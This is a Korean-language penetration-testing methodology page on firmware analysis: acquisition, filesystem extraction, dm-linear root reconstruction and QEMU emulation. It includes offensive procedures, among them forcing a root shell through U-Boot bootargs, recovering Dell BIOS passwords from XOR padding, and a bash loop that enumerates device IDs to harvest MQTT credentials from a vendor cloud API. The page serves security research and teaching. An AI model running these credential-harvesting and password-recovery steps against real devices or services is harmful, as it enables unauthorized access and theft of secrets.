# 펌웨어 분석

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **소개**

### 관련 리소스

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

펌웨어는 하드웨어 구성 요소와 사용자가 상호 작용하는 소프트웨어 간의 통신을 관리하고 원활하게 하여 기기가 올바르게 작동하도록 하는 필수 소프트웨어입니다. 펌웨어는 영구 메모리에 저장되므로 기기의 전원이 켜지는 순간부터 중요한 명령을 사용할 수 있고, 이를 통해 운영 체제가 시작됩니다. 보안 취약점을 식별하려면 펌웨어를 검사하고 필요에 따라 수정하는 과정이 중요합니다.<sup>[[2]](#references)[[3]](#references)</sup>

## **정보 수집**

**정보 수집**은 기기의 구성과 사용 기술을 파악하는 데 중요한 초기 단계입니다. 이 과정에서는 다음과 같은 데이터를 수집합니다.

- CPU 아키텍처와 실행 중인 운영 체제
- 부트로더 세부 정보
- 하드웨어 배치와 데이터시트
- 코드베이스 지표와 소스 위치
- 외부 라이브러리와 라이선스 유형
- 업데이트 기록과 규제 인증
- 아키텍처 및 흐름도
- 보안 평가와 확인된 취약점

이때 **오픈 소스 인텔리전스(OSINT)** 도구는 매우 유용하며, 사용 가능한 오픈 소스 소프트웨어 구성 요소를 수동 및 자동 검토 프로세스로 분석하는 것도 중요합니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore)과 같은 도구는 잠재적인 문제를 찾는 데 활용할 수 있는 무료 정적 분석 기능을 제공합니다.

## **펌웨어 확보**

펌웨어는 다양한 방법으로 확보할 수 있으며, 방법마다 복잡도가 다릅니다.

- 개발자나 제조업체 등 소스에서 **직접 확보**
- 제공된 지침에 따라 **빌드**
- 공식 지원 사이트에서 **다운로드**
- 호스팅된 펌웨어 파일을 찾기 위해 **Google dork** 쿼리 사용
- [S3Scanner](https://github.com/sa7mon/S3Scanner) 같은 도구로 **클라우드 스토리지**에 직접 접근
- 중간자 기법으로 **업데이트 가로채기**
- **UART**, **JTAG** 또는 **PICit** 같은 연결을 통해 기기에서 **추출**
- 기기 통신에서 업데이트 요청을 **스니핑**
- **하드코딩된 업데이트 엔드포인트** 식별 및 사용
- 부트로더나 네트워크에서 **덤프**
- 다른 방법이 모두 실패하면 적절한 하드웨어 도구를 사용해 저장 칩을 **분리하고 읽기**

### UART 로그만 있는 경우: 플래시에 있는 U-Boot 환경을 통해 root 셸 강제 실행

UART RX가 무시되는 경우(로그만 출력되는 경우)에도 **U-Boot 환경 블롭을** 오프라인에서 수정해 init 셸을 강제로 실행할 수 있습니다.<sup>[[6]](#references)</sup>

1. SOIC-8 클립과 프로그래머(3.3V)를 사용해 SPI 플래시를 덤프합니다:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env 파티션을 찾아 `bootargs`에 `init=/bin/sh`를 포함하도록 수정하고, blob의 **U-Boot env CRC32를 다시 계산**합니다.
3. env 파티션만 다시 플래시한 뒤 재부팅합니다. UART에서 shell이 나타나야 합니다.

이는 bootloader shell은 비활성화되어 있지만 외부 flash 접근을 통해 env 파티션에 쓸 수 있는 임베디드 장치에서 유용합니다.

## 펌웨어 분석하기

이제 **펌웨어를 확보했으므로**, 펌웨어를 어떻게 다뤄야 할지 알 수 있도록 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 도구는 다음과 같습니다.

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

해당 도구로 별다른 결과를 얻지 못했다면 `binwalk -E <bin>`으로 이미지의 **entropy**를 확인하세요. entropy가 낮으면 암호화되지 않았을 가능성이 높습니다. entropy가 높으면 암호화되었거나 어떤 방식으로 압축되었을 가능성이 높습니다.

또한 다음 도구를 사용해 **firmware에 포함된 파일**을 추출할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

파일을 검사하려면 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))를 사용할 수도 있습니다.

### 차등 flash 분석 및 복구 가능한 XOR 비밀 저장소

firmware 설정의 저장 형식이 문서화되어 있지 않다면, 먼저 동일한 flash 읽기 데이터를 여러 개 확보하고, 설정을 **정확히 하나만** 변경한 다음, 칩 전체를 다시 덤프해 오프셋을 비교하세요. 값을 통제하며 실험을 반복하면 해당 설정을 카운터 및 쓰기 메타데이터와 구분할 수 있습니다. 기존 위치가 아닌 새로운 오프셋에서 변경 사항이 발견되면 append-only 또는 로그 구조 저장소임을 나타냅니다. 삭제되거나 tombstone 처리된 항목도 보존하세요. 페이로드 바이트를 여전히 복구할 수 있을 수 있습니다.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

영역을 찾은 후 `binwalk` 같은 도구로 펌웨어 모듈을 추출하고 Ghidra에서 writer/validator를 리버스 엔지니어링합니다. 암호문 패턴만 보고 방식을 추측하지 말고, 코드에서 필드 경계, 패딩, 키 인덱싱 및 키 파생 방식을 확인합니다.<sup>[[12]](#references)</sup>

#### 암호화된 0 패딩에서 키 복구

[XOR 기반 암호화](../../crypto/symmetric/#xor-based-encryption)에서 설명한 것처럼, 알려진 평문을 사용하면 동일한 오프셋의 키스트림 바이트를 알아낼 수 있습니다. 고정 크기 필드는 반복 XOR 키의 모든 인덱스에 걸쳐 0 패딩이 채워지는 경우 특히 취약합니다. `0x00 XOR key_byte = key_byte`이므로, 암호화된 패딩에서 키 바이트를 직접 알아낼 수 있습니다. 모든 키 인덱스가 포함되어 있다면 암호문의 끝부분에서 키를 재구성한 다음, 데이터가 채워진 바이트를 복호화합니다.<sup>[[12]](#references)</sup>

Dell의 취약한 DVAR BIOS 암호 형식이 구체적인 예입니다. 32바이트 필드의 바이트 `0`은 평문이고, 바이트 `1..31`에는 반복되는 20바이트 키가 사용됩니다.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

비밀번호 길이가 `L`이면 XOR 전에는 `L..31` 위치가 0이었습니다. `L <= 12`인 경우 해당 위치들이 모든 키 인덱스를 포함하므로, brute force 없이 키 전체와 비밀번호를 복구할 수 있습니다:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### 과거 기록에서 키 가져오기

각 레코드를 독립적으로 분석하지 마세요. DVAR 키는 대략 `modified_md5(device_seed || variable_GUID || password[0])`로 파생됩니다. device seed와 GUID는 고정되어 있고, 비밀번호에 따라 달라지는 입력은 평문 첫 바이트뿐입니다. 따라서 장치당 키는 최대 256개이며, 같은 바이트로 시작하는 레코드는 같은 키를 공유합니다. 활성 레코드와 삭제된 레코드를 해당 바이트별로 그룹화하세요. 짧은 과거 레코드는 패딩을 통해 전체 키를 leak할 수 있으며, 이를 사용해 자체 패딩만으로는 부족한 현재의 긴 레코드를 복호화할 수 있습니다. 따라서 기존 암호문을 지우지 않고 tombstone 처리하면 비밀번호를 변경한 뒤 오히려 노출이 늘어날 수 있습니다.<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) 도구는 DVAR을 찾고, 후보 레코드를 검증하고, 비밀번호를 복구하며, 저장된 원시 바이트와 키 바이트를 표시할 수 있습니다. checkout에서 빌드한 다음, 검증된 플래시 이미지를 다음과 같이 스캔하세요.<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

사용자 지정 parser에서는 레코드 구조, 출력 가능한 문자 제약, zero-padding 검사, key entropy, key가 래핑되는 위치의 일관성을 사용해 오탐을 거부하세요. 반복해서 덤프했을 때 쓰기마다 일부 비트만 바뀐다면 관측된 마스크를 열거하고 이러한 제약을 사용해 수정 후보의 순위를 매기세요. 단, 휴리스틱 결과를 정확한 복구 결과로 제시하지 말고 모호한 문자는 모호하다고 보고하세요.<sup>[[12]](#references)</sup>

Password verifier는 복호화 가능한 ciphertext가 아니라 salt를 적용하고 반복 처리한 단방향 hash를 저장해야 합니다. 또한 log-structured 저장소에서는 더 이상 사용하지 않는 secret material을 안전하게 제거해야 합니다.<sup>[[12]](#references)</sup>

### 파일시스템 가져오기

앞서 설명한 도구를 주석 처리된 명령어처럼 `binwalk -ev <bin>` 사용했다면 **파일시스템을 추출**할 수 있었을 것입니다.\
Binwalk는 보통 파일시스템 유형의 이름을 딴 **폴더 안에** 파일시스템을 추출합니다. 일반적인 유형은 다음과 같습니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 파일시스템 수동 추출

때로는 binwalk의 시그니처에 **파일시스템의 magic byte가 없을 수 있습니다**. 이러한 경우 binwalk를 사용해 **파일시스템의 오프셋을 찾고 압축된 파일시스템을 바이너리에서 carve한 다음**, 아래 단계에 따라 유형에 맞게 파일시스템을 **수동으로 추출**하세요.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs 파일 시스템을 carving하려면 다음 **dd 명령어**를 실행합니다.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

또는 다음 명령을 실행할 수도 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs의 경우(위 예제에서 사용)

`$ unsquashfs dir.squashfs`

이후 파일은 "`squashfs-root`" 디렉터리에 생성됩니다.

- CPIO archive 파일

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 파일시스템의 경우

`$ jefferson rootfsfile.jffs2`

- NAND flash를 사용하는 ubifs 파일시스템의 경우

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### 분할된 임베디드 root filesystem 재구성

raw eMMC/SSD 덤프에 유효한 파일시스템 헤더가 있지만 메타데이터 오프셋이 명목상 파티션 범위를 벗어난다면, 즉시 손상된 것으로 분류하지 마세요. 임베디드 부팅 코드는 Device Mapper를 사용해 여러 물리적 범위에서 실제 root device를 구성할 수 있으므로, GPT 파티션 하나만 카빙하면 첫 번째 세그먼트만 추출됩니다.<sup>[[9]](#references)</sup>

#### 전체 미디어 이미지 분류

먼저 이미징이 완료되었고, 크기가 안정적이며, 이미지 파일을 계속 쓰고 있는 프로세스가 없는지 확인하세요. 파일 이름에 시작/끝 주소가 포함되어 있다면 해당 범위와 실제 바이트 수를 비교하세요. GPT를 읽기 전용 모드로 복구하고 필요한 범위만 연결하세요. 볼륨 그룹 충돌이나 의도치 않은 쓰기가 발생할 수 있으므로 워크스테이션에서 신뢰할 수 없는 물리 볼륨을 대상으로 `vgchange -ay`를 실행하지 마세요.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

원래의 init 로직이나 LVM 스택이 전체 이미지를 확인해야 한다면 일회용 VM을 사용하는 것이 좋습니다. 표준 boot 파티션의 과거 boot 로그는 특히 유용합니다. bootloader가 proprietary container의 오프셋, 구성 요소 길이, 슬롯 선택, 정렬 규칙, 서명 검증 정보를 기록했을 수 있습니다. 이 값을 사용해 내장된 command line/kernel/initramfs를 추출한 다음, 각 출력물을 `file`, magic bytes, `binwalk`로 개별 검증하세요. 컨테이너 끝까지 읽으면 실수로 initrd, ACPI object 또는 서명이 kernel에 덧붙을 수 있습니다.<sup>[[9]](#references)</sup>

#### boot 시점의 block map 복구

kernel의 initramfs를 추출하고 `/init`과 스토리지 라이브러리를 reverse engineering하세요. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/)에서 `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64`, 파티션 경로에 대한 문자열 참조를 찾아보세요. 그런 다음 활성 A/B 슬롯을 선택하고 테이블을 구성하는 코드를 추적하세요. 유용한 radare2 시작 명령은 `r2 -A init`, `afl`, `pdf @ main`, `pdf @ fcn.xxxxx`입니다.<sup>[[9]](#references)</sup>

linear target은 가상 장치의 연속된 범위를 하나 이상의 backing device 범위에 매핑합니다. 복구된 2개 세그먼트 테이블은 일반적으로 다음과 같은 형태입니다(모든 위치와 길이는 512바이트 섹터 단위).<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

정수 너비, 시프트 및 단위 변환을 포함해 기계어 산술 연산을 정확히 재현하세요. 예를 들어, 다음 식은 바이트 크기를 4-KiB 경계로 내림한 다음에야 512바이트 섹터로 변환합니다. 이를 `p4_bytes // 512`로 바꾸면 파티션이 페이지 경계에 정렬되지 않은 경우 선택된 끝부분이 `p4_bytes % 4096`만큼 이동합니다.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

테이블 순서대로 범위를 복사하고 청크 크기를 제한해 플랫 분석 이미지를 재구성하면 전체 미디어 덤프를 메모리에 적재하지 않아도 됩니다. 이렇게 하면 호스트 측 mapper 장치를 만드는 일도 방지할 수 있습니다. GPT에서 도출한 오프셋, 역산한 섹터 수, 결과 출력 길이는 각각 별도의 assertion으로 확인하세요.<sup>[[9]](#references)</sup>

#### 손상과 일정한 재구성 오류 구별하기

SquashFS의 경우 `unsquashfs`를 실행하기 전에 `hsqs` magic을 확인하고, superblock의 offset 40에 있는 little-endian 64비트 `bytes_used` 필드를 디코딩하세요. 서로 관련 없는 여러 구조에서 추출이 실패하면 예상 위치 주변의 넓은 범위를 검색하고, 압축 해제 가능한 metadata block, 연속된 여러 개의 유효한 directory entry, 그럴듯한 inode 필드, inode 수와 일치하는 root inode, 유효한 integrity-metadata 구조 등 구조적으로 신뢰할 수 있는 후보가 있는지 확인하세요. magic 하나만 일치하는 것은 충분하지 않습니다.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

동일한 부호 있는 델타로 서로 독립적인 구조(예: 디렉터리 메타데이터와 verity 레코드)가 유효해진다면, 바이트 누락보다는 세그먼트 시작 위치의 체계적인 오류가 원인일 가능성이 큽니다. 고아 복구나 파일시스템 메타데이터 패치를 시도하기 전에 역산으로 돌아가 버려진 나머지 값, 부호 처리, 오버플로 또는 섹터/페이지 반올림이 있는지 확인하세요.<sup>[[9]](#references)</sup>

마지막으로, 보호 경계를 구분하세요. TPM-sealed LUKS 볼륨은 데이터 기밀성을 보호하는 반면, 서명된 dm-verity 매핑은 루트 파일시스템의 무결성을 보호합니다. 소프트웨어 TPM으로는 원래 물리적 TPM에 봉인된 키를 복구할 수 없으며, verity 검증을 생략하는 연구 전용 init을 통해 수정된 SquashFS를 부팅한다고 해서 서명이 위조되거나 dm-verity가 무력화되는 것은 아닙니다.<sup>[[9]](#references)</sup>

## 펌웨어 분석

펌웨어를 확보한 후에는 구조와 잠재적 취약점을 파악하기 위해 펌웨어를 분석하는 것이 중요합니다. 이 과정에서는 다양한 도구를 사용해 펌웨어 이미지를 분석하고 유용한 데이터를 추출합니다.

### 초기 분석 도구

바이너리 파일(`<bin>`으로 표시됨)을 초기 검사하기 위한 명령어 모음이 제공됩니다. 이 명령어는 파일 유형 식별, 문자열 추출, 바이너리 데이터 분석, 파티션 및 파일시스템 세부 정보 파악에 도움이 됩니다:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

이미지의 암호화 상태를 평가하려면 `binwalk -E <bin>`으로 **엔트로피**를 확인합니다. 엔트로피가 낮으면 암호화되지 않았을 가능성이 높고, 높으면 암호화 또는 압축되었을 가능성이 있습니다.

**내장 파일**을 추출할 때는 **file-data-carving-recovery-tools** 문서와 파일 검사 도구인 **binvis.io** 같은 도구와 리소스를 사용하는 것이 좋습니다.

### 파일시스템 추출

`binwalk -ev <bin>`을 사용하면 대개 파일시스템을 추출할 수 있으며, 추출 결과는 보통 파일시스템 유형(예: squashfs, ubifs)을 이름으로 하는 디렉터리에 저장됩니다. 하지만 magic bytes가 없어 **binwalk**가 파일시스템 유형을 인식하지 못하면 수동 추출이 필요합니다. 이때 `binwalk`로 파일시스템의 오프셋을 찾은 다음 `dd` 명령으로 파일시스템을 추출합니다:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

이후 파일 시스템 유형(squashfs, cpio, jffs2, ubifs 등)에 따라 콘텐츠를 수동으로 추출하는 데 서로 다른 명령을 사용합니다.

### 파일 시스템 분석

파일 시스템을 추출하면 보안 결함을 찾기 시작합니다. 보안이 취약한 네트워크 데몬, 하드코딩된 자격 증명, API 엔드포인트, 업데이트 서버 기능, 컴파일되지 않은 코드, 시작 스크립트, 오프라인 분석을 위한 컴파일된 바이너리에 주의를 기울입니다.

검사해야 할 **주요 위치**와 **항목**은 다음과 같습니다.

- 사용자 자격 증명이 있는 **etc/shadow** 및 **etc/passwd**
- **etc/ssl**의 SSL 인증서와 키
- 잠재적 취약점이 있는 구성 파일 및 스크립트 파일
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 기기 웹 서버와 바이너리

파일 시스템에서 민감한 정보와 취약점을 찾는 데 도움이 되는 도구는 다음과 같습니다.

- 민감한 정보 검색을 위한 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 포괄적인 펌웨어 분석을 위한 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 정적 및 동적 분석을 위한 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), [**EMBA**](https://github.com/e-m-b-a/emba)

### 컴파일된 바이너리의 보안 점검

파일 시스템에서 발견된 소스 코드와 컴파일된 바이너리는 모두 취약점이 있는지 면밀히 조사해야 합니다. Unix 바이너리용 **checksec.sh** 및 Windows 바이너리용 **PESecurity**와 같은 도구를 사용하면 악용될 수 있는 보호되지 않은 바이너리를 식별할 수 있습니다.

## 파생된 URL 토큰을 통한 클라우드 구성 및 MQTT 자격 증명 수집

많은 IoT 허브는 다음과 같은 클라우드 엔드포인트에서 기기별 구성을 가져옵니다.<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

펌웨어 분석 중에 `<token>`이 하드코딩된 비밀 키를 사용하여 기기 ID로부터 로컬에서 파생되는 것을 발견할 수 있습니다. 예를 들면 다음과 같습니다.

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

이 설계에서는 기기 ID와 STATIC_KEY를 알아낸 누구나 URL을 재구성해 클라우드 구성을 가져올 수 있으며, 이 과정에서 평문 MQTT 자격 증명과 토픽 접두사가 노출되는 경우가 많습니다.

실무 절차:

1) UART 부팅 로그에서 deviceId 추출

- 3.3V UART 어댑터(TX/RX/GND)를 연결하고 로그를 캡처합니다:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 클라우드 구성 URL 패턴과 브로커 주소를 출력하는 줄을 찾습니다. 예를 들면:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) 펌웨어에서 STATIC_KEY와 token 알고리즘 추출

- 바이너리를 Ghidra/radare2에 로드하고 설정 경로("/pf/") 또는 MD5 사용을 검색합니다.
- 알고리즘을 확인합니다(예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 계산하고 digest를 대문자로 변환합니다:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) cloud config 및 MQTT credentials 수집

- URL을 구성하고 curl로 JSON을 가져온 다음, jq로 파싱해 secrets를 추출합니다.

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 평문 MQTT 및 취약한 topic ACLs 악용(존재하는 경우)

- 복구한 자격 증명을 사용해 maintenance topic을 구독하고 민감한 이벤트를 확인합니다:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 예측 가능한 device ID 열거(대규모로, 허가를 받고)

- 많은 생태계는 vendor OUI/product/type 바이트 뒤에 순차 접미사를 붙입니다.
- 후보 ID를 순회하고, token을 도출한 뒤, 프로그래밍 방식으로 config를 가져올 수 있습니다:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

메모
- 대규모 열거를 시도하기 전에 항상 명시적인 승인을 받으세요.
- 가능하면 대상 하드웨어를 수정하지 않고 시크릿을 복구할 수 있도록 에뮬레이션이나 정적 분석을 우선하세요.


펌웨어를 에뮬레이션하면 기기의 동작이나 개별 프로그램에 대한 **dynamic analysis**가 가능합니다. 이 접근 방식은 하드웨어 또는 아키텍처 종속성으로 인해 어려움이 생길 수 있지만, 루트 파일 시스템이나 특정 바이너리를 Raspberry Pi처럼 아키텍처와 엔디언이 일치하는 기기 또는 사전 빌드된 가상 머신으로 옮기면 추가 테스트를 진행할 수 있습니다.

### 개별 바이너리 에뮬레이션

단일 프로그램을 조사할 때는 프로그램의 엔디언과 CPU 아키텍처를 파악하는 것이 중요합니다.

#### MIPS 아키텍처 예시

MIPS 아키텍처 바이너리를 에뮬레이션하려면 다음 명령어를 사용할 수 있습니다:

```bash
file ./squashfs-root/bin/busybox
```

그리고 필요한 에뮬레이션 도구를 설치하려면:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS(big-endian)의 경우 `qemu-mips`를 사용하며, little-endian 바이너리에는 `qemu-mipsel`을 사용합니다.

#### ARM 아키텍처 에뮬레이션

ARM 바이너리의 경우에도 과정은 비슷하며, 에뮬레이션에는 `qemu-arm` 에뮬레이터를 사용합니다.

### 전체 시스템 에뮬레이션

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 등의 도구는 전체 펌웨어 에뮬레이션을 지원해 프로세스를 자동화하고 동적 분석을 돕습니다.

### 에뮬레이션을 위한 분할 및 검증된 root 파일시스템 재구성

SquashFS superblock은 읽을 수 있지만 inode, directory 또는 fragment-table 오프셋이 말이 되지 않는다면, 곧바로 `unsquashfs`를 수정하지 마세요. 초기 부팅 바이너리를 역공학하고 해당 바이너리가 구성하는 block-device 그래프를 재현하세요. 임베디드 시스템에서는 명목상 root 파티션을 노출하면서도, 다른 파티션에서 가져온 sector를 추가하는 `dm-linear` 매핑으로 실제 파일시스템을 구성할 수 있습니다. superblock만 검사하면 이후의 모든 metadata block이 잘못된 위치에 있더라도 검사가 통과할 수 있습니다.<sup>[[11]](#references)</sup>

펌웨어의 산술 연산을 정확히 재현하세요. 특히 길이의 단위가 byte, 512-byte sector 또는 4 KiB page 중 무엇인지 확인하고, shift와 절삭 연산을 원래 순서대로 재현하며, A/B 레이아웃에서 bank에 따라 달라지는 후미 영역도 고려해야 합니다. 예를 들어 `(partition_bytes >> 12) << 3`은 먼저 4 KiB 경계로 절삭한 다음 결과를 512-byte sector 단위로 나타냅니다. 이를 `partition_bytes // 512`로 바꾸면 추가된 extent의 위치가 몇 kilobyte 어긋나 이후의 모든 SquashFS 테이블이 손상될 수 있습니다.<sup>[[11]](#references)</sup>

다음과 같은 검증 절차를 사용할 수 있습니다.<sup>[[11]](#references)</sup>

1. verifier/init 바이너리에서 각 `dm-linear` 세그먼트의 source device, 시작 sector, 길이를 확인합니다.
2. 정렬 의미를 바꾸지 않고 extent를 연결하거나 매핑합니다.
3. 추출이 계속 실패한다면 예측한 경계 주변의 작은 범위만 검색하고, 그럴듯한 superblock 하나만 받아들이지 말고 연속된 여러 개의 유효한 metadata 구조를 확인합니다.
4. 수정하지 않은 `unsquashfs`로 재구성된 이미지를 검사합니다. 모든 directory와 fragment를 성공적으로 탐색하는 것은 `unsquashfs -stat`보다 강력한 근거입니다.

#### 분석가가 제어하는 dm-verity 대체

분석가가 QEMU kernel, initramfs, virtual disk를 제어하는 경우, vendor의 검증용 PID 1을 작은 정적 링크 init으로 대체해 수정된 root를 부팅할 수 있습니다. 이는 **실험실 환경의 boot-chain 대체**이며, dm-verity, RSA 서명, Secure Boot 또는 TPM에 봉인된 key를 무력화하는 것이 아닙니다.<sup>[[11]](#references)</sup>

대체 init은 원래 부팅 경로의 동작 중 핵심 부분을 재현해야 합니다. `devtmpfs`를 마운트하고, `setsid()`를 호출하며, `/dev/console`을 파일 디스크립터 0–2에 연결하고, `/proc`과 `/sys`를 마운트하며, 제공된 block device가 나타날 때까지 기다립니다. 그런 다음 편집한 root를 읽기 전용으로 마운트하고, 기존 root의 pseudo-filesystem을 분리한 뒤, 새 마운트를 `/`에 연결하고, `chroot`한 다음 펌웨어의 원래 `/sbin/init`을 `execve()`로 실행합니다. `MS_MOVE` **전에** `/dev`, `/proc`, `/sys`를 분리하면 새 root에 속한 마운트 지점을 실수로 분리하는 일을 방지할 수 있습니다.<sup>[[11]](#references)</sup>

수정 가능한 장치 상태는 수정된 불변 root와 분리해 두세요. qcow2 overlay를 사용하면 원본 디스크의 LVM 상태를 보존하면서, 두 번째 읽기 전용 virtio 디스크에서 편집한 SquashFS를 제공할 수 있습니다.<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 오프라인 이미지 상태 디버깅

느린 부팅, 파괴적인 시작 스크립트 또는 신뢰할 수 없는 콘솔 로깅으로 인해 장애 원인을 파악하기 어려운 경우, 게스트 외부에서 영구 상태를 검사하세요. 실행 중인 VM이 사용 중인 overlay는 절대 연결하지 마세요. `qemu-nbd`로 노출하고, LVM 검색 범위를 대상 NBD 파티션으로 제한한 다음, 연결을 끊기 전에 볼륨 그룹을 비활성화하세요.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

